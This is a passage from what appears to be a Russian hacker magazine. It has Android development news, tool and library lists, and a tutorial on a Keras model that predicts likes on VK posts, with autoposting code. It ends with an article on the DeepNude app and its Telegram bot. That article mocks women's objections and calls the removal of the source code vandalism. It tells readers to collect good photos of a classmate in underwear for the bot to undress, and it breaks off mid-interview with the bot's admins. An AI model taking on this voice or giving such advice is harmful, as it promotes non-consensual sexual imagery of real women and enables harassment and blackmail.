в тесте Fannkuch Redux. Причина: использование полноценного объ екта Inte‐
ger для хранения простых чисел в противо вес Java, которая использует
для этого переменные.
  В целом Java‐код оказался на 6,7% быстрее кода на Kotlin.


MVC, MVP, MVVM, MVI: в чем раз ница?
MVWTF: Demystifying Architecture Patterns — разбор и сравнение раз личных
паттернов проектирования ПО, поз воляющих разделить бизнес‐логику, дан‐
ные и графический интерфейс приложения.
  MVC (Model — View — Controller) — старей ший паттерн проектирования,
родившийся в 1970‐х годах в среде разработчиков Smalltalk. Он разделя ет
приложение на три компонента:
 • Модель — источник данных: база данных, сетевой ресурс, файл, что
   угодно. Модель отвечает только за извлечение данных, но не за их отоб‐
   ражение.
 • Пред ставление  (View)  отвечает  только  за  отображение  данных,
   без какой‐либо логики: что получил, то и показал.
 • Кон трол лер — связующее звено между моделью и представлением.
   Контроллер ответственен за получение данных модели и передачу их
   представ лению с внесением необ ходимых преобразований. Также кон‐
   троллер отве чает за получение данных из форм ввода и передачу их
   модели.





Главная проблема MVC в случае с Android заключа ется в том, что контроллер
и представление приходится реализовать внутри активнос ти или фрагмента,
а это значит, что они не будут по‐нас тоящему разделены, а написание unit‐
тестов существенно затруднится (нельзя просто так взять и написать JUnit‐
тест для активности или фрагмента).
  MVP (Model — View — Presenter) — раз витие идеи MVC, в котором кон‐
троллер отделен от представления с помощью абс трактного интерфейса.
MVP позволяет  по‐настоящему  отделить компоненты приложе ния  друг
от друга и упрощает unit‐тестирова ние.





MVVM (Model — View — ViewModel) — дальнейшее развитие MVP, в котором
контроллер/презентер полностью отвязан от представления. Роль контрол‐
лера здесь выпол няет ViewModel, которая, как и контроллер/презентер,
получает данные от модели и выполняет необ ходимые преобразования, но не
отдает их напрямую представлению. Вместо этого пред ставление под‐
писывается на обновления ViewModel и отоб ражает их по мере обновле ния.
MVVM реализуется с помощью реактивных фреймворков, таких как RxJava
или Android Architecture Components.





В случае с Android MVVM реша ет одну из самых раздражающих проблем:
потерю связей при изменении конфигура ции. Например, когда пользователь
поворачивает экран смартфона, Android убивает текущую активность и вос‐
создает ее заново. При использовании пат терна MVP презентер будет про‐
должать хранить ссылку на представление, которое находится в теперь уже
несуществующей  активнос ти. При использовании MVVM представление
во вновь созданной активнос ти просто подпишется на ViewModel, получит
от нее данные и отоб разит их.
  MVI (Model — View — Intent) — паттерн, призванный решить проблему
MVVM под названием «согласованность состояния». Дело в том, что на опре‐
деленном уров не сложности ViewModel на поверхность быстро вылезет слож‐
ность контроля текуще го состояния: ViewModel может быть изменена сразу
несколькими компонен тами приложения, а каждое изменение может привес‐
ти к конфликтам в общем сос тоянии ViewModel.
  Решить эту проб лему можно с помощью хорошо известных веб‐прог‐
раммистам инструментов: стейт‐контейнера и редусера (привет, Redux). С их
помощью можно создать единую точку хранения сос тояния приложения, поз‐
воляющую менять состояние атомарно и консистентно.
  Примеры реализации паттернов размещены на GitHub автора статьи.


Со веты по использованию Android Studio
Get the most out of Android Studio as an IDE — очередная статья на тему
эффективного использования Android Studio.
 • Скретч‑файл. Время от времени мы хотим проверить фрагмент кода
   на работоспособ ность. Android Studio позволяет сде лать это с помощью
   так называемого скретч‐файла, представляющего собой нечто вроде
   интерактивной консоли, в которой можно быстро запустить код на Java,
    Kotlin и других языках. Для вызова скретч‐фай ла набираем Ctrl + Shift + A,
   затем набираем scratch и жмем Enter. В коде мож но использовать любые
   классы из текущего проекта.
 • До кумен тация на модуль. Android Studio умеет автоматически показы‐
   вать документацию на любой модуль, подключенный к проекту. Для этого
   необходимо включить настройку File → Settings → Editor → General → Oth‐
   er section → Show quick documentation on mouse move, а затем провес ти
  мышкой над именем нужной функции.
 • По иск по коду. Что бы найти нуж ную функцию или переменную в коде
   проекта, достаточ но нажать Ctrl + Shift + F и ввести ее имя.
 • Форматиро вание кода. Выровнять отсту пы в коде, убрать лишние про‐
  белы и пустые строки можно с помощью комбинации Ctrl + Alt + L.
 • Быстрая навигация. Комбинации Ctrl + Alt + Влево и Ctrl + Alt + Вправо
   позволяют быстро перемещать ся между фрагментами кода, на которые ты
   переходил или которые правил в пос ледний раз.
 • Пе рек лючение вкладок. Комбинации Ctrl + Alt + [ и Ctrl + Alt + ] перек‐
   лючают открытые вкладки кода.


             ИНСТРУМЕНТЫ


 • Mobile  Security  Penetration  Testing   List —  подборка  инструментов
   для мобильного пен тестера;
 • kobackupdec — скрипт для расшифровки бэкапов, сделанных с помощью
   встроенных в смартфоны Huawei приложений HiSuite и KoBackup;
 • FBUnpinner — патч для Android‐версий приложений Facebook и WhatsApp,
   позволяющий обой ти SSL Pinning.


              БИБЛИОТЕКИ


 • AndroidX Tech — сайт с дополнительной информацией о библиотеках
  семейства Android X;
 • Colibri — библиотека для автоматизированного тестирования UI приложе‐
   ния;
 • Ulfberht — написанный на Kotlin DI‐фреймворк;
 • Submarine — всплывающая панель навигации;
 • Coil — написанная на Kotlin библиотека для заг рузки изображений, быс‐
   трая и легкая альтернатива Picasso и Glide;
 • sign‐in‐with‐apple‐button‐android — Android‐биб лиоте ка для аутентифика‐
   ции с помощью сервиса Sign In with Apple;
 • ﬁnch — панель для инспекции okHttp‐трафика;
 • kotlin‐multiplatform‐template — готовый темплейт для мультиплатфор‐
  менного Kotlin‐приложения, в комплекте: бэкенд, фронтенд, Android‐при‐
   ложение и iOS‐приложение;
 • Bulldog — библиотека, упрощающая работу с SharedPreferences;
 • SimpleGenericAdapter — универсальный адаптер для RecyclerView;
 • ProgressView — анимированный гибко нас тра иваемый виджет прогресса;
 • BottomNavigator — библиотека  для  навигации между  фрагментами
   с помощью табов в нижней части экрана.
COVERSTORY





РОБОТИЗИРУЕМ SMM

        КАК НАУЧИТЬ НЕЙРОСЕТЬ
     ПРЕДСКАЗЫВАТЬ УСПЕШНОСТЬ
        ПОСТОВ В СОЦСЕТИ



У меня есть своя груп па «Вконтакте», и мне
стало интересно, можно ли спрогнозиро‐
 вать, будет публикация успешной или нет. Я
решил написать программу, которая бы
автоматичес ки брала текст поста, проверя‐         Алексей Карпович                                                                                                    soniksky@tut.by
ла его с помощью нейронной сети и пуб‐
ликовала толь ко в том случае, если веро‐
ятность  получить  одобрение  аудитории
достаточно  высока.  Разрабатывать  мы
будем на Qt5 и используем Python и Keras
для обучения нейросети.


Для начала в проекте на Qt в файле .pro подклю чим библиотеку network,
 добавив строку QT += network. Что бы разместить пост на сте не группы,
 выпол няем код:


 QString cit = "Hello!";
 QUrl apiUrl;
 QString str = "https://api.vkontakte.ru/method/wall.
 post?owner_id=‐78329950&message=" + cit + "&from_group=1&access
 _token=abcdef&v=5.73";
 apiUrl.setUrl(str);
 QByteArray requestString = "";


 QNetworkRequest request(apiUrl);
 request.setRawHeader("Content‐Type", "application/octet‐stream");


 QNetworkAccessManager manager_vk;
 connect(&manager_vk, SIGNAL(finished(QNetworkReply*)), this, SLOT(
 slotV(QNetworkReply*)));
 manager_vk.post(request, requestString);

 Как видишь, мы отправляем запрос POST с адресом в переменной str.
 Используем метод VK API wall.post, чтобы разместить пост на сте не группы.
 Параметр owner_id должен быть равен номеру группы, но записан со знаком
 минус; параметр message содержит текст пос та; from_group — указатель, что
 пост будет размещен от имени сообщес тва, он равен единице; access_to‐
 ken — токен доступа.


        WWW

                     •Подробная докумен тация по VK API
                      •Руководство по созданию приложений для VK
                        и получению access_token


Ты мог заметить, что для обра бот ки зап роса мы подключили слот slotV. Он
 может выглядеть так:


 void MainWindow::slotV(QNetworkReply* r)
 {
     qDebug() << QString::fromUtf8(r‐>readAll());
 }

В консоли ты увидишь результат зап роса: ошиб ку, если что‐то пойдет не так,
 или сообщение с номером опубликованного пос та.


СОБИРАЕМ БАЗУ ДАННЫХ ДЛЯ ОБУЧЕНИЯ НЕЙРОННОЙ СЕТИ
 Чтобы обучить нейронную сеть, нам нужна обширная база данных постов,
 оцененных реальными пользователями. Ты можешь взять данные из своей
 группы, а можешь воспользовать ся данными из любой другой открытой груп‐
 пы. Нам нужно собрать файл с отметками о количестве лай ков для каждого
 поста. Для этого напишем программу.
   Чтобы извлечь каждый пост, отправляем запрос GET:


 QString str = "https://api.vk.com/method/wall.getById?posts=‐783299
 50_" + QString::number(cnt) + "&v=5.84&access_token=abcdef";

Мы используем метод VK API wall.getById: извлекаем пост со стены группы
 по его номеру.
   Параметр posts содержит уникальный идентификатор поста (здесь —
 ‐78329950_123), который состоит из идентифика тора группы со знаком
 минус и порядкового номера пос та, раз деленных знаком _. Порядковый
номер поста содержится в переменной cnt. Параметр access_token —
 это токен доступа к группе.
   Отправим этот запрос столько раз, сколько постов нам нужно извлечь,
 изменяя перемен ную cnt в соот ветствии с порядковым номером поста.
 Получим код HTML, который будет содержать текст поста, количество лайков
 и другую информацию. Рас парсим каждый ответ, чтобы извлечь из него текст
 и количество лайков. Сохраним в текстовый файл данные, которые мы
 получили.


 номер поста #1
     текст поста #1
     количество лайков #1
     номер поста #2
     текст поста #2
     количество лайков #2
     ...
     номер поста #n
     текст поста #n
     количество лайков #n

 Теперь, когда все посты записа ны в файл, мы готовы синтезировать нейрон‐
 ную сеть и обучать ее.


KERAS
Нам понадобится Keras — биб лиотека для работы с нейронными сетями.


             INFO

                         Есть замечательная книга — «Глубокое обучение
                       на Python» Франсуа Шолле. По ней ты можешь
                       освоить  теорию,  ознакомиться  с  примера ми
                      решения задач от самых простых до весьма слож‐
                         ных, таких как сверточные сети и генерация изоб‐
                       ражений.


Для начала выполним ряд стандартных действий и установим Python:


 $ sudo apt‐get update
 $ sudo apt‐get upgrade
 $ sudo apt‐get install python‐pip python‐dev python‐setuptools

Затем установим пакеты научных вычислений для Python:


 $ sudo apt‐get install build‐essential cmake git unzip pkg‐config
 libopenblas‐dev liblapack‐dev
 $ sudo apt‐get install python‐numpy python‐scipy python‐matplotlib
 python‐yaml
 $ sudo apt‐get install libhdf5‐serial‐dev python‐h5py

Поставим TensorFlow:


 $ sudo pip install tensorflow

И саму библиотеку Keras:


 $ sudo pip install keras

Можно установить Keras и из репозитория на GitHub. В этом случае ты
 получишь доступ к папке keras/examples с примера ми сце нариев.


 $ git clone https://github.com/fchollet/keras
 $ cd keras
 $ sudo python setup.py install

 Чтобы проверить, что все уста новилось, попробуй запус тить сце нарий Keras.


 python examples/mnist_cnn.py

Для выполнения этого примера может потребоваться несколько минут.


СИНТЕЗИРУЕМ И ОБУЧАЕМ НЕЙРОННУЮ СЕТЬ
Основу своей нейронной сети я выбрал из биб лиотек Keras — нейронная
 сеть предсказывает, какой отзыв получит рецензия на фильм: положительный
 или отрицательный. В нашем случае сеть будет определять, получит пост лай‐
 ки или нет. Начнем с подключения всех необходимых библиотек и модулей.


 #! /usr/bin/env python
 # ‐*‐ coding: utf‐8 ‐*‐


 from keras.preprocessing.text import Tokenizer


 from keras.preprocessing import sequence
 from keras.models import Sequential, load_model
 from keras.layers import Dense, Dropout, Activation
 from keras.layers import Embedding
 from keras.layers import Conv1D, GlobalMaxPooling1D


 import numpy as np
 import pickle

Объявим два массива: string_list и mark_list. В первом будут храниться
 тексты постов, а во втором ноль, если у соответству ющего поста не было лай‐
 ков, и единица, если были. Прочитаем все пос ты из созданного ранее фай ла
 базы данных.


 string_list = []
 mark_list = []
 handle = open("vkbase.txt", "r")
 for i in range(20000):
     s = handle.readline()
     s = handle.readline()
     string_list.append(s)
     s = handle.readline()
     l = int(s)
     if l > 0:
         mark_list.append(1)
     else:
         mark_list.append(0)

Создадим и подготовим токенайзер:


 tokenizer = Tokenizer(num_words=15000)
 tokenizer.fit_on_texts(string_list)

 Токенайзер создает таблицу, в которой каждому слову из нашего массива
 постов присваивается уникальное число. Максималь ное число в моем слу‐
 чае — 15000.
   Сохраним таблицу токенайзера в файл, чтобы пользоваться ей в даль‐
 нейшем:


 with open('tokenizer.pickle', 'wb') as hand:
     pickle.dump(tokenizer, hand, protocol=pickle.HIGHEST_PROTOCOL)

А теперь преобразуем наш массив постов в мас сив чисел в соответствии
 с таблицей токенайзера:


 sequences = tokenizer.texts_to_sequences(string_list)

 Тут я бы хотел отметить, что мы про читали не все пос ты из файла, а только те,
 которые нам понадобятся для обучения нейронной сети. Давай прочитаем
 оставшиеся 3000 постов, которые будут использоваться для проверки
 работоспособности нашей нейросети, и также преобразуем их в массивы
 чисел.


 string_list_test = []
 mark_list_test = []


 for i in range(3000):
     s = handle.readline()
     s = handle.readline()
     string_list_test.append(s)
     s = handle.readline()
     l = int(s)
     if l > 0:
         mark_list_test.append(1)
     else:
         mark_list_test.append(0)


 sequences_test = tokenizer.texts_to_sequences(string_list_test)

Далее наши массивы надо привести к формату, удобному для понимания
 нейронной сетью. Это значит, что число слов в каждом посте дол жно быть
 одинаковым. Зададим его равным 400. Если в каком‐нибудь посте будет
 меньше слов, то оставшиеся числа заполнятся нулями:


 x_train = sequence.pad_sequences(sequences, maxlen=400)
 x_test = sequence.pad_sequences(sequences_test, maxlen=400)

На данный момент все подготовитель ные мероприятия завершены, и мы
можем синтезиро вать нейронную сеть.


 print('Build model...')
 model = Sequential()


 # We start off with an efficient embedding layer which maps
 # our vocab indices into embedding_dims dimensions
 model.add(Embedding(20000,
                     50,
                     input_length=400))
 model.add(Dropout(0.2))


 # We add a Convolution1D, which will learn filters
 # word group filters of size filter_length:
 model.add(Conv1D(250,
                 3,
                 padding='valid',
                 activation='relu',
                 strides=1))
 # We use max pooling:
 model.add(GlobalMaxPooling1D())


 # We add a vanilla hidden layer:
 model.add(Dense(250))
 model.add(Dropout(0.2))
 model.add(Activation('relu'))


 # We project onto a single unit output layer, and squash it with a
 sigmoid:
 model.add(Dense(1))
 model.add(Activation('sigmoid'))

 Этот код я полностью взял из примера и заменил лишь размерности данных.
   Давай скомпилируем нашу нейронную сеть.


 model.compile(loss='binary_crossentropy',
                     optimizer='adam',
                     metrics=['accuracy'])

А теперь напишем код, который запустит тренировку сети и сохранит резуль‐
 тат в файл, чтобы он не потерялся.


 model.fit(x_train, mark_list, batch_size=32, epochs=15, valida
 tion_data=(x_test, mark_list_test))
 model.save("vkbase.h5")

 Чтобы начать обучение, нужно запус тить наш скрипт на исполнение из кон‐
 соли. В терминале дол жна появиться бегущая строка.



  14784/20000 [=====================>........] ‐ ETA: 8s ‐ loss: 0.5232 ‐
  acc: 0.7835


Процесс может занять до десяти минут, придет ся подождать. У меня точность
 обучения составила 62%. Это говорит о том, что в данных была найдена
 закономерность и сеть можно использовать по наз начению. Если бы резуль‐
 тат составил 50% или меньше, это зна чило бы, что закономерностей не най‐
 дено и нейронная сеть просто угадывает исход с той же вероятностью.
   Давай проверим, как работает наша сеть.


 network = load_model("vkbase.h5")
 strin = ["А ты знаешь, мне сегодня грустно. Люди разучились быть
 людьми, В этом мире стало слишком пусто... Слов не надо... Просто
 обними... Наталия Коденцова"]


 #loading tokenizer
 with open('tokenizer.pickle', 'rb') as handle:
     tokenizer = pickle.load(handle)


 seq = tokenizer.texts_to_sequences(strin)
 x_seq = sequence.pad_sequences(seq, maxlen=400)


 prediction = network.predict(np.array(x_seq), verbose=1)
 print(prediction)

 Этот скрипт показывает, с какой вероятностью данная цитата получит лайк.
Им мы и будем пользоваться в дальнейшем.


ВНЕДРЯЕМ НЕЙРОННУЮ СЕТЬ НА PYTHON В ПРОЕКТ НА С++
Наша нейронная сеть обучена и готова к исполь зованию. Теперь нам надо
 внедрить ее в проект на С++ на платформе Qt5, который будет постить отоб‐
 ранные посты в ВК.


 #include "/usr/include/python2.7/Python.h"


 Py_Initialize();


 PyObject *moduleMainString = PyString_FromString("__main__");
 PyObject *moduleMain = PyImport_Import(moduleMainString);


 PyRun_SimpleString(
     "import pickle\n"
     "import numpy as np\n"
     "from keras.preprocessing.text import Tokenizer\n"
     "from keras.preprocessing import sequence\n"
     "from keras.models import Sequential, load_model    \n"
     "def neuron(text):                                 \n"
     "   network = load_model(\"/home/alex/Projects/vkbase/vkbase.h5\"
 )            \n"
     "   strin = [text]\n"
     "   #loading tokenizer                                 \n"
     "   with open(\"/home/alex/Projects/vkbase/tokenizer.pickle\", \"
 rb\") as handle:    \n"
     "      tokenizer = pickle.load(handle)              \n"
     "   seq = tokenizer.texts_to_sequences(strin)       \n"
     "   x_seq = sequence.pad_sequences(seq, maxlen=400)     \n"
     "   prediction = network.predict(np.array(x_seq), verbose=1) \n"
     "   return prediction                                    \n"
 );

 Тебе нужно только про писать свои пути к фай лам vkbase.h5 и tokenizer.
 pickle.
   Скрипт, который мы внедрили в проект, — функция под названием neuron,
 которая принимает параметр text и возвращает вероятность в виде числа
 prediction. Опишем доступ к нашей функции и аргу мент, который мы будем
 в нее отдавать.


 PyObject *func = PyObject_GetAttrString(moduleMain, "neuron");
 char [] cit = "Hello!";
 PyObject *args = PyTuple_Pack(1, PyString_FromString(cit));

 Здесь переменная cit — это пост, который надо проверить. Теперь вызовем
нашу функцию с постом в качес тве аргу мента и получим результат.


 PyObject *result = PyObject_CallObject(func, args);
 double koef = PyFloat_AsDouble(result);

Переменная koef и есть наш результат, вероятность того, что пост получит
 лайки. Теперь мы можем проверить его: если он больше 0.5, мы можем раз‐
мещать пост в сети, если мень ше — лучше взять другой.
   Таким образом мы можем реализовать автопос тинг: завести таймер (нап‐
 ример, на один час), по его сра батыванию брать пост из банка постов, про‐
 верять на пригодность с помощью нейронной сети и публиковать в слу чае
 успеха.


ВЫВОДЫ
После внедрения описанного проекта в реальной группе ВК я увидел резуль‐
 тат довольно скоро. Количес тво лайков не сильно изме нилось, но количество
 подписчиков продол жает рас ти, так что этот проект оказал ся не только инте‐
 ресным, но и полезным. Надеюсь, не для меня одно го :)


        WWW

                     •Исходники проекта
COVERSTORY

  ГОЛЫЕ
  ФАКТЫ





                                        ShəLMā
                                            schelma@protonmail.com

       КАК НЕЙРОСЕТЬ DEEPNUDE
     РАЗДЕВАЕТ ЖЕНЩИН НА ФОТО





У каждого сурового мужика старше двенадцати лет имеется
как минимум три сокровенных желания: погонять на крутой
тачке с табуном диких лошадей под капотом, выиграть
в  казино  миллион  долларов  и  раздеть  при  случае
какую‐нибудь симпатичную тяночку. И если c достижением
первых двух пунктов все не так просто, третий легко воп‐
лотить. Не веришь? Речь о про екте DeepNude, который
использует в своей работе адскую смесь из ней росетей,
искусственного интеллекта и полового инстинкта.


DEEPNUDE: БОЛЬШОЕ ОТКРЫТИЕ
Летом 2019 года житель ница Син гапура по имени Роуз обнаружила на одном
из форумов собственную фотографию, сделанную за несколько месяцев
до этого. На исходном снимке девуш ка позировала в купальнике, однако
в новом образе она предстала перед вос торженной публикой не только топ‐
лес, но и, страш но сказать, без трусов. Так началась эпоха DeepNude — при‐
ложения, уме юще го бесстыдно раз девать на фото представительниц прек‐
расного пола.
  DeepNude взорвал интернет в минувшем июне, когда этот программный
продукт был впервые представлен на рын ке в виде бесплатной базовой
и продвинутой премиум‐версии. Ано нимный разработчик, скры вающийся
под псевдонимом Альберто, благора зумно решил не обнародовать свою
истинную личность, известно только, что предположительно он из Эстонии.
  В интервью изданию Vice Альберто признался, что на создание DeepNude
его вдохновила подхваченная в детстве идея «рентгеновских очков», способ‐
ных чудесным образом лишить одеж ды любого человека, на которого пос‐
мотрит их обладатель. Отту да же, судя по всему, взял ся и логотип приложе‐
ния, на котором изображен воору женный таким девайсом чувак похаб‐
но‐глумливой внешности.





             Те самые «рентгеновские» очки из семидесятых

Можно предположить, что безоблачное детс тво автора DeepNude пришлось
на конец семиде сятых — начало восьмидеся тых годов прошлого века —
именно тогда легенды о «рентгеновских очках», «красной фотопленке» и про‐
чих достижениях науки, превращающих объективную реальность в порнохаб,
имели хождение в среде советских юношей, мужественно преодолевавших
этап полового созревания в рядах всесоюзной пионерской организации име‐
ни В. И. Ленина.



     Я не вуайерист, я технологичес кий энту зиаст, — откровенничал в сво-
     ем интервью Альбер то. — Около двух лет назад я открыл для себя
      потенциал искусс твенного интеллек та и начал изу чать основы. Когда я
       узнал, что генера тив но‑сос тязательные нейросети (Generative adver-
        sarial  network, GAN)  могут пре обра зовы вать днев ные фотографии
      в ноч ные, я понял, что можно прев ратить оде того челове ка на фотог-
     рафии в обна женного. Эврика! Я осоз нал, что рентгенов ские очки воз-
      можны! Движимый весельем и энту зиаз мом бла года ря этому откры-
      тию, я провел пер вые тес ты, получив инте рес ные результаты.

Результаты и впрямь оказались очень и очень интерес ными: лично мне хва‐
тило пары суток присталь ного изу чения телеграм‐версии DeepNude, чтобы
почувствовать себя самым настоящим интернет‐гинекологом.





  Результат работы DeepNude иногда бывает оригинален и непредсказуем


DEEPNUDE: БОЛЬШОЕ ЗАКРЫТИЕ
Оригинальная программа просуществовала всего лишь четыре дня: ее явле‐
ние миру подняло чудовищную волну вос хищения воз мущения во всех
цивилизованных и считающих себя таковыми странах. По мнению прог‐
рессивной общественности, обна жение женщин на фотографи ях без их
ведома и согласия самым варварским образом ущемляет права и оскорбля‐
ет чувства прекрасной половины человечес тва.
  О задетых чувствах мужчин, на фоточках которых бес совестный искусс‐
твенный интеллект, подло хихикая, в точности так же пририсовывал титьки и
вареник, общественность почему‐то до сих пор хра нит скорбное молчание.





               Кина не будет, электричество кончилось!

Поддавшись все обще му порица нию, разработчик устыдился и закрыл проект,
кончив в эфир прощальным твитом о том, что мир еще не готов к приходу
DeepNude. Но было поздно. Исходные коды  программы, выложенные
на GitHub, начали свое победное шествие по интернетам. Анонимные извра‐
щенцы скачивали прогу, а потом сливали ее на торренты и фай лообменники
вместе с инструкциями по уста новке, нас тройке и сборке софтины под Win‐
dows, Linux и Android.
  Администрация GitHub вскоре без жалос тно выпилила это безобразие
со своего ресурса, оправдывая такой акт вандализ ма тем, что DeepNude,
видите ли, нарушает правила сообщества. Но даже несмотря на это, найти
исходники в Сети можно и по сей день, причем без особых усилий.


КАК УСТРОЕН DEEPNUDE
Со временем на основе бывшей коммерчес кой версии DeepNude был создан
вполне рабочий софт: в коде пофиксили многочис ленные ошибки и удалили
оттуда совершенно лишний кусок программы, добавлявший на голые фото
надпись о том, что это изображение — фейк. Затем в Сети стали появляться
многочисленные фор ки, родившиеся в результате реверс‐инжиниринга ори‐
гинального проекта. Шумный  успех  эстонского разработчика  оказался
заразительным.





            Искусственный интеллект такой искусс твенный

Изначально приложение DeepNude было написано на Python и скомпилиро‐
вано в исполняемые файлы. Прог рамма использует в работе библиотеки Qt,
Numpy и PyTorch и может ускорять динами чес кую генерацию изображений
с  использованием  ресурсов  порногра фичес ких  процессоров   Nvidia
при помощи технологии CUDA.
  В основе DeepNude лежит сос тязательный алгоритм машинного обучения
GAN, хорошо зарекомендовавший себя все в тех же пионерских восьмидеся‐
тых — когда одна команда школьников решала на скорость математические
задачки, а вторая тщательно иска ла в этих решени ях ошибки (после чего
«банан» в журнал благополучно получа ли и те и дру гие).
  В рассматриваемом нами случае между собой соревнуются две ней‐
росети, одна из которых генерирует веселые картинки, а вторая пытается
отличить реальные фото от обра зов, соз данных нездоровым машинным
разумом. «Педивикия» ут вержда ет, что этот метод позволяет получить впол не
реалистичные изоб ражения котиков, но мы‐то с тобой знаем его истинное
предназначение, открытое нам синь ором Альберто, — промышленное сись‐
костроение.





                    DeepNude — это весело!

Обученная модель — готовая база данных с алгоритмами генерации кар‐
тинок, построенная в результате обработки информации нейросетью, —
была разбита на три файла общим объемом 2,1 Гбайт, которые подгру жались
в приложе ние из амазоновско го облачно го хранилища после завершения
установки. Несмотря на то что учетку в обла ке уже давно прикрыли, обу ченная
модель попала в Сеть вместе с исходниками DeepNude, благодаря чему
сегодня мы можем любоваться веселыми картинка ми на голубых экранах
наших электронно‐вычислительных машин.
  Примечательно, что у DeepNude есть встро енные механизмы модифи‐
кации загружаемых данных, чтобы ее обученную модель не могли исполь‐
зовать другие приложения. Впрочем, после попадания исходников в паблик
это уже не имеет большого значения.
  DeepNude использовал в качестве фундамента открытый проект pix2pix,
реализованный в стенах Калифорнийского университета еще в 2017 году.
Pix2pix, базирующийся на GAN, поз воляет строить новые изображения
на основе исходных картинок, для чего он использует базу данных нейросети,
где собраны соответствующие алго ритмы.
  Например, с помощью pix2pix можно превратить летний пейзаж в зимний,
а черно‐белую фотографию — в цвет ную. В нашем случае DeepNude ана‐
лизировал исходное изображение, определял его ключевые точки, а затем
среди десятков тысяч картинок с обнаженной натурой выискивал наиболее
подходящую по размеру, ракурсу, оттенку и прочим параметрам. После чего,
как говаривал небезызвестный начальник колбасного цеха МС Вспышкин,
«вызываем голых баб»: программа попросту заменя ет прикрытые одеждой
фрагменты исходного снимка похожими элементами, но уже без таковой.
Магия!





                Вспышкин знал толк в голых бабах

Иными словами, нейронка не раз девает сфотографированную модель силой
своего могучего искусс твенного интеллекта, а лепит на нее наиболее
похожие ракурсом и размером сиськи из своей богатейшей графической
коллекции. И тут нельзя не отметить правоту соз дателя приложения Альбер‐
то, который говорил, что вреда в DeepNude не боль ше, чем «Фотошопе», пос‐
кольку принцип действия у обеих программ оди наковый. Просто DeepNude
раздевает теток быстрее и делает это автоматически, в то время как фотошо‐
пить нужно еще уметь.


Проб лемы FaceApp
Похожий принцип используют и дру гие популярные раз влекательные при‐
ложения, способные модифицировать фотог рафии при помощи автомати‐
ческих алгоритмов и самообучающих ся ней росетей. Среди них — приз‐
нанная угро зой национальной безопас ности США программа FaceApp, поль‐
зователи которой в недавнем прошлом наводнили интернеты фоточками сво‐
их сморщенных хариусов.
  Замечу, что в свое время у FaceApp тоже воз никали проблемы с блюс‐
тителями закон ности и нравс твенности, пос коль ку одна из первых версий
этого мобильного приложения позволяла менять на портретах не только пол
и возраст, но также расу — эта функция была признана оскорбительной
для национальных мень шинств.


А вот разработчики из Папского католического университета в Риу‐Гран‐
ди‐ду‐Сул (Бразилия) создали на базе той же технологии своего бота,
который,  наоборот,  целомудренно  пририсо выва ет  голым  женщинам
на фотографиях нижнее белье. Удивительно, но вариант с раздеванием
почему‐то пользуется у ано нимусов зна чительно большей популярностью.
Ученым еще предстоит исследовать при чины это го феномена.





БУРЛЕНИЕ ЭМОЦИЙ
Борцы с DeepNude аргументируют свою позицию тем, что поддельная обна‐
женка может использоваться злоумыш ленниками для кибербуллинга, шан‐
тажа и дискредитации женщин. С дру гой сто роны, искусс твенный интеллект
все еще выполняет свою работу весьма посредс твенно, поэтому потенциаль‐
ной жертве будет относительно несложно доказать фейковость подобных
фотографий — достаточ но предъявить общес твенности ори гинал.
  Прав Альберто и в другом: DeepNude специализиру ется на прекрасном
поле прежде всего потому, что собрать исходный материал для обучения
нейросети в этом случае значитель но проще: картинок с раздетыми жен‐
щинами в интернете на порядки больше, чем с голыми мужчинами. Хотя, сда‐
ется мне, Альберто просто не там искал.


DEEPNUDE В TELEGRAM
Несмотря на все перипетии с закрытием ори гиналь ного проекта и бурлением
общественности, проект DeepNude прекрасно себя чувс твует до сих пор. Так,
на  его  основе  отечес твенные  анонимусы  разработали  телеграм‐бота,
который делает все то же самое, что и нашумевшее приложение, — раздева‐
ет женщин на загруженных пользователем снимках.
  Для получения успешного результата следует соблюдать всего лишь нес‐
колько несложных правил. Нуж но добыть фотографии твоей одноклассницы
в хорошем качестве, желательно в белье или в купальнике, лучше всего, если
девушка стоит лицом к фотографу, а ее волосы не должны лежать на гру ди.
  Домашних животных и муж чин бот без жалостно превращает в гермафро‐
дитов, с мультяшными персонажа ми справляется чуть лучше, так что пок‐
лонникам аниме и манги будет где разгуляться. На канале бота в Telegram
можно найти ссылку на галерею наиболее удачных снимков, обработанных
искусственным интеллектом.
  Правда, при просмотре этой подборки на ум почему‐то навяз чиво при‐
ходит анекдот про старого слепого охотника, умевшего на ощупь определять
породу и способ умерщвления дичи, — «еж, убит топором».





   С анимешными тяночками DeepNude справляется очень неплохо, ня!


ИНТЕРВЬЮ С АДМИНАМИ БОТА
Мы не могли отказать себе в удовольствии и задали владельцам бота нес‐
колько вопросов, из ответов на которые получилось небольшое, но содер‐
жательное интервью.
  — Есть ли какая‑то статистика, которую мож но пуб ликовать?
 — На текущий момент в сутки обра батывается около 10 тысяч запросов,
а аудитория бота составляет около 50 К пользователей.
  — Расскажите в двух сло вах об инфраструк туре. Достаточ но ли
для работы бота одной машины, или приходится как‑то рас-
парал леливать, использовать облачные сервисы?
 — Используется модель, где есть основной сервер с ботом и несколько
серверов для обработки запросов, за счет этого достигается хорошая ско‐
рость.
  — Как дол го фото сто ит в оче реди на бесплатную обработку?
Какие были рекорды?
 — Пик был 3000 пользователей в очереди, пос ле этого мы улучшили архи‐
тектуру бота. В данный момент скорость стабиль ная, очередь максимально
достигает 200+ человек.
  — Вно сились ли какие‑то изме нения в исходный код Deep-
Nude? В модель?
 — На текущем этапе изменения по сравнению с оригиналом не очень зна‐
чительные, но работа ведется... Есть нес колько интересных идей, которые
уже находятся в процессе воплощения.
  — Почему в качестве платформы выб ран «Телеграм», а не
просто веб‑сайт или что‑то еще?
 — Мы не выбирали платформу, все получилось случайно. Один создал
телеграм‐аккаунт deepnude и чат, в чате начались активные тесты программы,
были предприняты первые попытки сделать бота. В итоге собралась группа
единомышленников, которым это было интерес но, и понеслось... Конечно,
если бы мы были стартапом, мы бы рассмотрели другие, более популярные
и прибыльные платформы, но у нас нет такой цели.
  — Монетизация подоб ного про екта через Telegram — удоб но ли
это в современ ных реалиях, под ходит ли пользовате лям? Нас-
колько вооб ще инфраструк тура Telegram в его нынеш нем виде,
с вашей точ ки зре ния, под ходит для коммерческих про ектов?
 — Монетизация не является целью про екта, прос то в какой‐то момент
количество пользователей превысило наши ожидания, и нам понадобились
средства для масштабиро вания. Тогда мы решили попросить пользователей
поддержать проект, прикрутили платежи. Если говорить о «Телеграме», то
в целом для монетизации фриланса на данный момент мы так и не смогли
найти удобный для себя инс трумент, ждем появления TON (Telegram Open
Network).
  —  Есть ли  «топ  знаменитостей»,  обнажен ные  фотографии
которых инте ресу ют пользовате лей чаще все го?
